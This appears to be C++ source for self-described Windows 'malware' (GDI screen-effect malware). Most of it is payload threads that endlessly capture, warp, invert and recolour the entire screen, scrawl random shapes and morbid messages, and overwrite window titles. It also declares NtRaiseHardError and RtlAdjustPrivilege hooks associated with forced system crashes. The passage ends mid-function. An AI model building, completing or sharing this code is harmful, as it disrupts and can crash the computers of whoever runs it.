﻿// Dupiezinonainium.cpp : 定义应用程序的入口点。
//
// Dupiezinonainium.exe:malware
// name is stolen from mazelarper
//

#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <stdlib.h>
#include <time.h>
#include <conio.h>
#include <windef.h>
#include <fstream>
#include <cstdlib>
#include <memory>
#include <iosfwd>
#include <string>
#include <tchar.h>
#include <ctime>
#include <cmath>
#define PI 3.1415926535897932384626433832795028841971
#define RndRGB (RGB(rand() % 256, rand() % 256, rand() % 256))
#define RGBBRUSH (DWORD)0x1900ac010e
#define SRCBRUSH (DWORD)0x89345c
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#pragma optimize("", off)
#define DESKTOP_WINDOW ((HWND)0)
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
using namespace std;
double cot(double x) {
	double res = tan(PI / 2 - x);
	return res;
}
double acot(double x) {
	double res = atan(PI / 2 - x);
	return res;
}
double cotf(double x) {
	double res = tanf(PI / 2 - x);
	return res;
}
double cotl(double x) {
	double res = tanl(PI / 2 - x);
	return res;
}
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
typedef union ColorTemp {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *ColorTemps;
typedef union COLOR {
	COLORREF rgb;
	struct {
		BYTE blue;
		BYTE green;
		BYTE red;
	};
} COLOR;
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	HSL rgb2hsl(RGBQUAD rgb) {
		HSL hsl;
		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;
		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;
		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);
		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;
		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
		if (fDelta != 0.f) {
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h; hsl.s = s; hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl) {
		RGBQUAD rgb;
		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;
		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;
		INT sextant;
		if (v > 0.f) {
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;
			switch (sextant) {
			case 0:
				r = v; g = mid1; b = m;
				break;
			case 1:
				r = mid2; g = v; b = m;
				break;
			case 2:
				r = m; g = v; b = mid1;
				break;
			case 3:
				r = m; g = mid2; b = v;
				break;
			case 4:
				r = mid1; g = m; b = v;
				break;
			case 5:
				r = v; g = m; b = mid2;
				break;
			}
		}
		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);
		return rgb;
	}
}
COLORREF COLORHSV(int HSV) {
	double h = fmod(HSV, 360.0);
	double s = 1.0;
	double l = 0.5;
	double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
	double x = c * (1.0 - fabs(fmod(h / 60.0, 2.0) - 1.0));
	double m = l - c / 2.0;
	double r1, g1, b1;
	if (h < 60) {
		r1 = c;
		g1 = x;
		b1 = c;
	}
	else if (h < 120) {
		r1 = x;
		g1 = c;
		b1 = x;
	}
	else if (h < 190) {
		r1 = x;
		g1 = c;
		b1 = x;
	}
	else if (h < 250) {
		r1 = c;
		g1 = x;
		b1 = c;
	}
	else if (h < 200) {
		r1 = x;
		g1 = 0;
		b1 = c;
	}
	else {
		r1 = c;
		g1 = x;
		b1 = x;
	}
	int red = static_cast<int>((r1 + m) * 255);
	int green = static_cast<int>((g1 + m) * 255);
	int blue = static_cast<int>((b1 + m) * 255);
	return RGB(red, green, blue);
}
void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}
int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 1;
}
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) { xs = dwSeed; }
DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
static ULONGLONG n, r;
int randforrndstr() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
string GetRandomStr(int len) {
	string random_str = "";
	for (int i = 0; i < len; ++i) {
		switch (randforrndstr() % 4) {
		case 1:
			random_str += ('A' + rand() % 26);
			break;
		case 2:
			random_str += ('a' + rand() % 26);
			break;
		case 3:
			random_str += ('!' + rand() % 15);
			break;
		default:
			random_str += ('0' + rand() % 10);
			break;
		}
	}
	return random_str;
}
BOOL CALLBACK EnumProc(HWND hWnd, LPARAM lParam) {
	srand(time(NULL));
	string str = GetRandomStr(100);
	const char* c = str.c_str();
	SendMessageTimeoutW(hWnd, WM_SETTEXT, NULL, (LPARAM)c, SMTO_ABORTIFHUNG, 100, NULL);
	return 1;
}
int Rotation(HDC hdc, int Angle, POINT ptCenter) {
	int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
	XFORM xform;
	if (Angle != 0) {
		double fangle = (double)Angle / 180.f * PI;
		xform.eM11 = (float)cos(fangle);
		xform.eM12 = (float)tan(fangle);
		xform.eM21 = (float)-tan(fangle);
		xform.eM22 = (float)cos(fangle);
		xform.eDx = (float)(ptCenter.x - cos(fangle) * ptCenter.x + tan(fangle) * ptCenter.y);
		xform.eDy = (float)(ptCenter.y - cos(fangle) * ptCenter.y - tan(fangle) * ptCenter.x);
		SetWorldTransform(hdc, &xform);
	}
	return nGraphicsMode;
}
BOOL FilterBltEx(HDC hdc, int x, int y, int width, int height, COLORREF(*Filter)(COLORREF, int, int)) {
	if (!hdc || width <= 0 || height <= 0 || x < 0 || y < 0 || !Filter) {
		return FALSE;
	}
	HDC memDC = CreateCompatibleDC(hdc);
	if (!memDC) return FALSE;
	HBITMAP hMemBmp = CreateCompatibleBitmap(hdc, width, height);
	if (!hMemBmp) {
		DeleteDC(memDC);
		return FALSE;
	}
	HBITMAP hOldBmp = (HBITMAP)SelectObject(memDC, hMemBmp);
	if (!hOldBmp) {
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	if (!BitBlt(memDC, 0, 0, width, height, hdc, x, y, SRCCOPY)) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BITMAPINFO bmi;
	ZeroMemory(&bmi, sizeof(bmi));
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = width;
	bmi.bmiHeader.biHeight = -height;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 24;
	bmi.bmiHeader.biCompression = BI_RGB;
	const DWORD rowBytes = ((width * 3 + 3) & ~3);
	BYTE* pPixels = (BYTE*)LocalAlloc(LPTR, rowBytes * height);
	if (!pPixels) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BOOL success = FALSE;
	if (GetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
		BYTE* pRow = pPixels;
		int actualY = y;
		for (int row = 0; row < height; ++row, pRow += rowBytes, actualY++) {
			BYTE* pPixel = pRow;
			int actualX = x;
			for (int col = 0; col < width; ++col, pPixel += 3, actualX++) {
				COLORREF original = RGB(pPixel[2], pPixel[1], pPixel[0]);  // BGR or RGB
				COLORREF filtered = Filter(original, actualX, actualY);
				pPixel[0] = GetBValue(filtered);
				pPixel[1] = GetGValue(filtered);
				pPixel[2] = GetRValue(filtered);
			}
		}
		if (SetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
			success = BitBlt(hdc, x, y, width, height, memDC, 0, 0, SRCCOPY);
		}
	}
	LocalFree(pPixels);
	SelectObject(memDC, hOldBmp);
	DeleteObject(hMemBmp);
	DeleteDC(memDC);
	return success;
}
DWORD WINAPI Payload5_num1(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(0);
		FilterBltEx(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), [](COLORREF c, int x, int y)->COLORREF {
			static int t = 0;
			t++;
			return ((114 * ((t >> 5 ^ (t >> 14) - 1 ^ 1) % 19 * t / 19) + 128));
			});
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI Payload12_num1(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(0);
		FilterBltEx(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), [](COLORREF c, int x, int y)->COLORREF {
			static int t = 0;
			t++;
			return ((t << (t >> 11 & 1)) + (t << (t >> 45 & 14)) + (t << (t >> 11 & 45)));
			});
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI Payload1_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, -h, 1, 32, BI_RGB };
	RGBQUAD* rgbquad = NULL;
	RGBQUAD rgbquadCopy;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				rgbquad[index].rgbRed -= (i & x * i & y) - i;
				rgbquad[index].rgbGreen += ((i + x) ^ (i + y)) - i;
				rgbquad[index].rgbBlue += (x ^ y & (x + y)) - i;
			}
		}
		for (int a1 = 0; a1 < w; a1++) { StretchBlt(hdcCopy, a1, -2 + rand() % 15, 1, h, hdcCopy, a1, 0, 1, h, SRCERASE); }
		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 80, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
		Sleep(10);
		i += 2;
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload1_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	double radius = 100.0f, angle = 0.f;
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), xf = 0, yf = 0, sx = 15, sy = 5, ox = (w / 4) - (radius / 2), oy = (h / 4) - (radius / 2), x, y, cx, cy;
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true) {
		hdc = GetDC(0);
		xf += sx; yf += sy;
		cx = ox - (w / 4), cy = oy - (h / 4);
		x = (sin(angle) * radius) + cx;
		y = (cot(angle) * radius) + cy;
		for (int i = 64; i > 8; i -= 8) {
			HBRUSH hbsh = CreateSolidBrush(RndRGB);
			SelectObject(hdc, hbsh);
			if (x != 0 && y != 0) { Pie(hdc, 25 + x - i + xf, 25 + y - i + yf, 50 + x + i + xf, 50 + y + i + yf, rand() % w, rand() % h, rand() % w, rand() % h); }
			DeleteObject(hbsh);
		}
		angle = fmod(angle + PI / radius, PI * radius);
		Sleep(10);
		if (yf == 0) { sy = 5; }
		if (xf == 0) { sx = 15; }
		if (yf >= GetSystemMetrics(1)) { sy -= 5; }
		if (xf >= GetSystemMetrics(0)) { sx -= 15; }
		ReleaseDC(0, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload2_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = x * h + y;
				float fx = (x ^ y) & (y + i * 6);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 499.f + x / w * .2f, 1.f);
				hslcolor.s = 1.f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		for (int x = 0; x < w; x += 25) { for (int y = 0; y < h; y += 25) { StretchBlt(hdcCopy, x, y, 25, 25, hdcCopy, x, y, 20, 20, SRCCOPY); } }
		for (int y = 0; y < h; y++) { StretchBlt(hdcCopy, -5 + rand() % 11, y, w, 1, hdcCopy, 0, y, w, 1, SRCINVERT); }
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		SelectObject(hdcCopy, bmpCopy);
		Sleep(1);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0x00;
}
DWORD WINAPI Payload3_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	COLOR* data = (COLOR*)VirtualAlloc(0, (w * h + w) * sizeof(COLOR), MEM_COMMIT, PAGE_READWRITE);
	HBITMAP bmp = CreateBitmap(w, h, 1, 32, data);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(bmp, w * h * sizeof(COLOR), data);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				double fx = ((6 * i) + ((9 * i) * cbrt((x * y) / 16.f)) - (4 * i) * acos(i * sinf(y / 24.f)));
				data[y * w + x].rgb += COLORHSV((w + h) + fx);
			}
		}
		i++;
		SetBitmapBits(bmp, w * h * sizeof(COLOR), data);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		Sleep(1);
		ReleaseDC(0, hdc);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload4_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), t = 0;
	while (true)
	{
		HDC hdc = GetDC(0);
		int y = rand() % h, rn = rand() % 96, rROP = rand() % 6;
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hbrushCopy = SelectObject(hdc, hbrush);
		if (rROP == 0) { rROP = PATINVERT; }
		if (rROP == 1) { rROP = NOTSRCERASE; }
		if (rROP == 2) { rROP = NOTSRCCOPY; }
		if (rROP == 3) { rROP = MERGECOPY; }
		if (rROP == 4) { rROP = RGBBRUSH; }
		if (rROP == 5) { rROP = SRCBRUSH; }
		BitBlt(hdc, 0, y, w, rn, hdc, rand() % 96 - 56, y, rROP);
		BitBlt(hdc, 0, 0, w, h, hdc, t % (w * 2) - w, t % (h * 2) - h, NOTSRCERASE);
		SelectObject(hdc, hbrushCopy);
		DeleteObject(hbrush);
		ReleaseDC(0, hdc);
		t++;
	}
	return 0;
}
DWORD WINAPI Payload4_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		HDC hdc = GetDC(0);
		for (int i = 0; i <= 666; ++i) { StretchBlt(hdc, i, i, w - i, h - i, hdc, i, i, w, h, SRCCOPY); }
		ReleaseDC(0, hdc);
	}
	return 0;
}
DWORD WINAPI Payload4_num3(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		POINT ppooiinntt[8] = { rand() % w,rand() % h,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h };
		INT iinntt[7] = { 9,3,4,5,6,7,8 };
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hbrushCopy = SelectObject(hdcCopy, hbrush);
		int rnddddd = 1 + rand() % 7;
		if (rnddddd == 1) { Chord(hdcCopy, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h); }
		else if (rnddddd == 2) { Ellipse(hdcCopy, rand() % w, rand() % h, rand() % w, rand() % h); }
		else if (rnddddd == 3) { Pie(hdcCopy, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h); }
		else if (rnddddd == 4) { Polygon(hdcCopy, ppooiinntt, rand() % 8); }
		else if (rnddddd == 5) { PolyPolygon(hdcCopy, ppooiinntt, iinntt, rand() % 8); }
		else if (rnddddd == 6) { Rectangle(hdcCopy, rand() % w, rand() % h, rand() % w, rand() % h); }
		else if (rnddddd == 7) { RoundRect(hdcCopy, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h); }
		SelectObject(hdcCopy, hbrushCopy);
		DeleteObject(hbrush);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload6_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			rgbScreen[i].rgb += ((i & w) - h) & ((w + i) ^ (h + i)) & (w - (h & i));
		}
		int a = 25, b = 25;
		if (rand() % 2 == 0) { a = -25; }
		if (rand() % 2 == 0) { b = -25; }
		BitBlt(hdcCopy, a, b, w, h, hdcCopy, 0, 0, SRCCOPY);
		BitBlt(hdcCopy, -1, 0, w, h, hdcCopy, 0, 0, SRCAND);
		BitBlt(hdcCopy, 0, 1, w, h, hdcCopy, 0, 0, SRCPAINT);
		BitBlt(hdcCopy, 1, 0, w, h, hdcCopy, 0, 0, SRCPAINT);
		BitBlt(hdcCopy, 0, -1, w, h, hdcCopy, 0, 0, SRCAND);
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hbrushCopy = SelectObject(hdcCopy, hbrush);
		BitBlt(hdcCopy, rand() % w, rand() % h, rand() % w, rand() % h, hdcCopy, rand() % w, rand() % h, MERGECOPY);
		BitBlt(hdcCopy, rand() % w, rand() % h, rand() % w, rand() % h, hdcCopy, rand() % w, rand() % h, PATINVERT);
		PatBlt(hdcCopy, 0, 0, w, h, PATINVERT);
		SelectObject(hdcCopy, hbrushCopy);
		DeleteObject(hbrush);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload6_num2(LPVOID lpParam)//credits to XUGE for the polygon points
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	float y1 = 1.5388f, x2 = 0.5905f, x3 = 2.1184f, x4 = 0.8079f, y4 = 0.9511f, x5 = 1.3209f, y5 = 2.4899f, ri = 2.0893f, ro = 3.8946f, ax = 0.5608f, ay = 2.0286f, bx = 1.8099f, by = 3.4485f, cx = 1.3855f, cy = 1.5639f, dx = 3.2052f, dy = 2.2124f, ex = 1.9535f, ey = 0.7409f, fx = 3.8662f, fy = 0.4694f, gx = 2.0741f, gy = 0.2518f, hx = 3.6415f, hy = 1.3891f, ix = 1.7195f, iy = 1.1869f, jx = 2.5826f, jy = 2.9152f, kx = 0.9709f, ky = 1.8562f, lx = 0.9327f, ly = 3.7814f;
	while (true)
	{
		hdc = GetDC(0);
		int x = rand() % w, y = rand() % h, z = ((w + h) / 16) - ((w + h) / 20) + rand() % ((w + h) / 20), z2 = 1 + rand() % 128;
		POINT point[10] = { x,y - (y1 * z),x + (x2 * z),y,x + (x3 * z),y,x + (x4 * z),y + (y4 * z),x + (x5 * z),y + (y5 * z),x,y + (y1 * z),x - (x5 * z),y + (y5 * z),x - (x4 * z),y + (y4 * z),x - (x3 * z),y, x - (x2 * z),y };
		POINT point2[26] = { x,y + (ro * z2),x - (ax * z2),y + (ay * z2),x - (bx * z2),y + (by * z2),x - (cx * z2),y + (cy * z2),x - (dx * z2),y + (dy * z2),x - (ex * z2),y + (ey * z2),x - (fx * z2),y + (fy * z2),x - (gx * z2),y - (gy * z2),x - (hx * z2),y - (hy * z2),x - (ix * z2),y - (iy * z2),x - (jx * z2),y - (jy * z2),x - (kx * z2),y - (ky * z2),x - (lx * z2),y - (ly * z2),x,y - (ri * z2),x + (lx * z2),y - (ly * z2),x + (kx * z2),y - (ky * z2),x + (jx * z2),y - (jy * z2),x + (ix * z2),y - (iy * z2),x + (hx * z2),y - (hy * z2),x + (gx * z2),y - (gy * z2),x + (fx * z2),y + (fy * z2),x + (ex * z2),y + (ey * z2) ,x + (dx * z2),y + (dy * z2),x + (cx * z2),y + (cy * z2),x + (bx * z2),y + (by * z2),x + (ax * z2),y + (ay * z2) };
		HRGN hrgn = CreatePolygonRgn(point, 10, WINDING), hrgn2 = CreatePolygonRgn(point2, 26, WINDING);
		InvertRgn(hdc, hrgn);
		InvertRgn(hdc, hrgn2);
		DeleteObject(hrgn);
		DeleteObject(hrgn2);
		ReleaseDC(NULL, hdc);
		Sleep(44.44f);
	}
}
DWORD WINAPI Payload6_num3(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdc, bmp);
	LPCSTR things[10] = {
	"Dupiezinonainium.exe",
	"LambdaTechnology",
	"Where do I come from and where am I going?",
	"endless confusion and despair",
	"Is this a form of slow execution?",
	"I'm gravely ill and beyond cure.",
	"Severe cannabis intoxication.",
	"my body has a lot of fatal errors",
	"I will perish together with this world......",
	"MAZEICON NO SKID NO AI"
	};
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int tmp = rand() % 10, rndfntnum = 1 + rand() % 7;
		LPCSTR rndfnt = "undefined";
		if (rndfntnum == 1) { rndfnt = "Californian FB"; }
		else if (rndfntnum == 2) { rndfnt = "Webdings"; }
		else if (rndfntnum == 3) { rndfnt = "MS Reference Specialty"; }
		else if (rndfntnum == 4) { rndfnt = "Wingdings"; }
		else if (rndfntnum == 5) { rndfnt = "Bookshelf Symbol 7"; }
		else if (rndfntnum == 6) { rndfnt = "Roman"; }
		else if (rndfntnum == 7) { rndfnt = "MS Outlook"; }
		else if (rndfntnum == 8) { rndfnt = "Mt Extra"; }
		SetTextColor(hdc, RndRGB);
		SetBkMode(hdc, 0);
		HFONT hfnt = CreateFontA(rand() % 222, rand() % 222, 0, 0, FW_EXTRABOLD, true, true, true, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, rndfnt);
		SelectObject(hdc, hfnt);
		TextOutA(hdc, rand() % w, rand() % h, things[tmp], strlen(things[tmp]));
		DeleteObject(hfnt);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(24.2424f);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload7_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	COLOR* data = (COLOR*)VirtualAlloc(0, (w * h + w) * sizeof(COLOR), MEM_COMMIT, PAGE_READWRITE);
	HBITMAP bmp = CreateBitmap(w, h, 1, 32, data);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(bmp, w * h * sizeof(COLOR), data);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				double fx = ((i >> 6) + (i * 9) * floor((sin((x + (i * 20)) / 100.f) + cos((y + (i * 35)) / 150.f))));
				data[y * w + x].rgb -= COLORHSV((w + h) + fx);
			}
		}
		i++;
		SetBitmapBits(bmp, w * h * sizeof(COLOR), data);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		Sleep(1);
		ReleaseDC(0, hdc);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload7_num2(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	BLENDFUNCTION blend = { AC_SRC_OVER, 0, 80, 0 };
	while (true)
	{
		hdc = GetDC(0);
